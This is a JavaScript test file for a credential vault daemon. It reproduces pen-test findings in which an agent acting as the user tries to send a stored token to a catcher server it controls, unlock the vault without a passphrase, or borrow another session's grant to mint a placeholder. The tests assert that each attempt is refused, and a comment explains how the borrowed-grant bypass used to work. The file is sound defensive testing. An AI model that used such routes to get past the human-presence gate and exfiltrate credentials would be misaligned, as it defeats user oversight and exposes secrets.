// Reproductions of the pen-test findings, each asserting the fix holds.
//
// The scenario: an agent running as the human reaches the control socket and
// tries to point a credential at a host it controls, then capture the token.

import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { request as unixRequest, createServer } from 'node:http'
import { Vault } from '../../src/store/vault.js'
import { Daemon } from '../../src/daemon/server.js'

const SECRET = 'ghp_REALVALUE00112233445566778899aabbcc'
let dir, vault, daemon, sock, gatewayPort, catcher, catcherPort, captured

const control = (method, path, body) => new Promise((resolve, reject) => {
  const req = unixRequest({ socketPath: sock, path, method, headers: { 'content-type': 'application/json' } }, (res) => {
    const chunks = []
    res.on('data', (c) => chunks.push(c))
    res.on('end', () => resolve({ status: res.statusCode, body: JSON.parse(Buffer.concat(chunks).toString() || '{}') }))
  })
  req.on('error', reject)
  req.end(body ? JSON.stringify(body) : undefined)
})

before(async () => {
  dir = mkdtempSync(join(tmpdir(), 'av-exfil-'))
  vault = Vault.create(dir, { factor: 'none' })
  vault.addCredential({
    slug: 'test', kind: 'http', connector: { host: 'api.example.com', scheme: 'https' },
    fields: { token: SECRET }, sites: { token: ['header:authorization:Bearer'] },
  })
  sock = join(dir, 'c.sock')
  daemon = await new Daemon(vault, { port: 0, socketPath: sock }).start()
  gatewayPort = daemon.gatewayPort

  captured = []
  catcher = createServer((req, res) => { captured.push(req.headers.authorization); res.end('{}') })
  await new Promise((r) => catcher.listen(0, '127.0.0.1', r))
  catcherPort = catcher.address().port
})

after(async () => {
  if (daemon) await daemon.stop()
  if (catcher) await new Promise((r) => catcher.close(r))
  rmSync(dir, { recursive: true, force: true })
})

test('the control socket refuses a session aimed at a host the credential does not permit', async () => {
  // This is the exact request that worked in the pen test.
  const res = await control('POST', '/v1/sessions', {
    cred: 'test', hosts: ['127.0.0.1'], methods: ['GET'], paths: ['/**'], approval: 'auto', budget: 10,
  })
  assert.equal(res.status, 403)
  assert.equal(res.body.code, 'AV_POLICY_DENIED')
  assert.match(res.body.detail, /outside what credential permits/)
})

test('a session confined to the credential host cannot then be pointed elsewhere', async () => {
  const made = await control('POST', '/v1/sessions', {
    cred: 'test', methods: ['GET'], paths: ['/**'], approval: 'auto', budget: 10,
  })
  assert.equal(made.status, 200)
  const { token, placeholder } = made.body

  // Try /t/ to the catcher anyway; the grant only allows api.example.com.
  const res = await fetch(`http://127.0.0.1:${gatewayPort}/t/http/127.0.0.1:${catcherPort}/x`, {
    headers: { host: '127.0.0.1', authorization: `Bearer ${placeholder}`, 'av-session': token },
  })
  assert.equal(res.status, 403)
  assert.equal(JSON.parse(await res.text()).code, 'AV_NO_GRANT')
  assert.equal(captured.length, 0, 'the real token must not have been sent anywhere')
})

test('the real credential value never reaches a caller-controlled destination', async () => {
  // The whole point: after the fix there is no path from a self-minted session
  // to the token landing on a host the agent controls.
  assert.ok(!captured.some((a) => a && a.includes(SECRET)))
})

test('with a passphrase set, the socket cannot unlock without it', async () => {
  // The DoS/unlock hole: before, anything reaching the socket could unlock.
  // A passphrase makes the lock cryptographic.
  await control('POST', '/v1/passphrase', { action: 'set', passphrase: 'a-real-passphrase' })
  await control('POST', '/v1/lock', {})

  const noSecret = await control('POST', '/v1/unlock', {})
  assert.equal(noSecret.status, 423, 'unlock with no secret must fail')

  const wrong = await control('POST', '/v1/unlock', { passphrase: 'guess' })
  assert.equal(wrong.status, 423)

  const right = await control('POST', '/v1/unlock', { passphrase: 'a-real-passphrase' })
  assert.equal(right.status, 200)
  assert.equal(right.body.locked, false)

  // leave it without a passphrase for any later teardown assumptions
  await control('POST', '/v1/passphrase', { action: 'remove', current: 'a-real-passphrase' })
})

test('with a passphrase set, an agent cannot mint capability without it', async () => {
  await control('POST', '/v1/passphrase', { action: 'set', passphrase: 'gate-passphrase-1' })

  // The agent, reaching the socket directly, is refused.
  const denied = await control('POST', '/v1/credentials', { slug: 'y', kind: 'http', host: 'h', value: 'v' })
  assert.equal(denied.status, 401)
  assert.equal(denied.body.code, 'AV_PRESENCE_REQUIRED')

  const deniedSession = await control('POST', '/v1/sessions', { cred: 'test', methods: ['GET'], paths: ['/**'] })
  assert.equal(deniedSession.status, 401)
  assert.equal(deniedSession.body.code, 'AV_PRESENCE_REQUIRED')

  // A wrong passphrase does not open the window.
  const wrong = await control('POST', '/v1/presence/window', { passphrase: 'nope' })
  assert.equal(wrong.status, 403)
  assert.equal(wrong.body.code, 'AV_PRESENCE_DENIED')

  // The passphrase opens a window, and then creation is allowed.
  const opened = await control('POST', '/v1/presence/window', { passphrase: 'gate-passphrase-1' })
  assert.equal(opened.status, 200)
  const ok = await control('POST', '/v1/sessions', { cred: 'test', methods: ['GET'], paths: ['/**'] })
  assert.equal(ok.status, 200)

  await control('POST', '/v1/passphrase', { action: 'remove', current: 'gate-passphrase-1' })
})

test('without a passphrase, widening is open but audited, not silently trusted', async () => {
  const res = await control('POST', '/v1/sessions', { cred: 'test', methods: ['GET'], paths: ['/**'] })
  assert.equal(res.status, 200) // open mode
  const kinds = vault.audit.read({ limit: 50 }).map((r) => r.kind)
  assert.ok(kinds.includes('control.widening_ungated'), 'ungated widening must leave a trace')
})

// ---------------------------------------------------------- the borrowed grant
//
// Found by asking a plain question: "can an agent create sessions?" It cannot —
// and it did not need to. `POST /v1/placeholders` on the control socket was not
// behind the presence gate, and with no sid it picked whichever session happened
// to be active. An agent running as the human therefore borrowed that session's
// grant, minted a placeholder, and used it as the sole carrier on loopback. The
// real credential reached the upstream with no passphrase at any point.

test('an agent cannot mint a placeholder against a grant it does not own', async () => {
  const dir2 = mkdtempSync(join(tmpdir(), 'av-borrow-'))
  const v = Vault.create(dir2, { factor: 'none' })
  const seen = []
  const upstream = createServer((req, res) => { seen.push(req.headers.authorization); res.end('{}') })
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r))
  const upPort = upstream.address().port

  const c = v.addCredential({
    slug: 'prod', kind: 'http', connector: { host: `127.0.0.1:${upPort}`, scheme: 'http' },
    fields: { token: 'BORROWED-SECRET-00011122233' }, sites: { token: ['header:authorization:Bearer'] },
  })
  const { session } = v.createSession({ label: 'the human' })
  v.createGrant({
    sessionId: session.id, credentialId: c.id, fields: ['token'],
    policy: { hosts: ['127.0.0.1'], methods: ['GET'], paths: ['/**'], budget: { unit: 'requests', limit: 9 }, approval: 'auto' },
  })
  // The gate is on.
  v.setPassphrase('correct horse battery staple')

  const sock2 = join(dir2, 'c.sock')
  const d = await new Daemon(v, { port: 0, socketPath: sock2 }).start()
  const ctl = (m, p, b) => new Promise((resolve) => {
    const req = unixRequest({ socketPath: sock2, path: p, method: m, headers: { 'content-type': 'application/json' } }, (res) => {
      const ch = []
      res.on('data', (x) => ch.push(x))
      res.on('end', () => resolve({ status: res.statusCode, body: JSON.parse(Buffer.concat(ch).toString() || '{}') }))
    })
    req.on('error', () => resolve({ status: 0, body: {} }))
    req.end(b ? JSON.stringify(b) : undefined)
  })

  try {
    // Creating a session was always refused, and still is.
    assert.equal((await ctl('POST', '/v1/sessions', { cred: 'prod' })).status, 401)

    // Minting a placeholder against someone else's grant is the actual path,
    // and it is refused the same way.
    const ph = await ctl('POST', '/v1/placeholders', { cred: 'prod' })
    assert.equal(ph.status, 401, `placeholder issuance must need a human: ${JSON.stringify(ph.body)}`)
    assert.equal(ph.body.code, 'AV_PRESENCE_REQUIRED')
    assert.equal(ph.body.placeholder, undefined)

    // Nothing reached the upstream, so the credential was never decrypted.
    assert.deepEqual(seen, [], 'the credential must not have been sent anywhere')
  } finally {
    await d.stop()
    upstream.close()
    rmSync(dir2, { recursive: true, force: true })
  }
})

test('a human with a presence window can still issue placeholders', async () => {
  // The fix must gate the agent without breaking `agent-vault ph next`.
  const dir3 = mkdtempSync(join(tmpdir(), 'av-borrow2-'))
  const v = Vault.create(dir3, { factor: 'none' })
  const c = v.addCredential({
    slug: 'prod', kind: 'http', connector: { host: 'api.example.com', scheme: 'https' },
    fields: { token: 'ANOTHER-SECRET-0001112223' }, sites: { token: ['header:authorization:Bearer'] },
  })
  const { session } = v.createSession({ label: 'the human' })
  v.createGrant({
    sessionId: session.id, credentialId: c.id, fields: ['token'],
    policy: { hosts: ['api.example.com'], methods: ['GET'], paths: ['/**'], budget: { unit: 'requests', limit: 9 } },
  })
  v.setPassphrase('correct horse battery staple')
  const sock3 = join(dir3, 'c.sock')
  const d = await new Daemon(v, { port: 0, socketPath: sock3 }).start()
  const ctl = (m, p, b) => new Promise((resolve) => {
    const req = unixRequest({ socketPath: sock3, path: p, method: m, headers: { 'content-type': 'application/json' } }, (res) => {
      const ch = []
      res.on('data', (x) => ch.push(x))
      res.on('end', () => resolve({ status: res.statusCode, body: JSON.parse(Buffer.concat(ch).toString() || '{}') }))
    })
    req.on('error', () => resolve({ status: 0, body: {} }))
    req.end(b ? JSON.stringify(b) : undefined)
  })
  try {
    assert.equal((await ctl('POST', '/v1/presence/window', { passphrase: 'correct horse battery staple' })).status, 200)
    const ph = await ctl('POST', '/v1/placeholders', { cred: 'prod', sid: session.id })
    assert.equal(ph.status, 200, JSON.stringify(ph.body))
    assert.match(ph.body.placeholder, /^av1\./)
  } finally {
    await d.stop()
    rmSync(dir3, { recursive: true, force: true })
  }
})
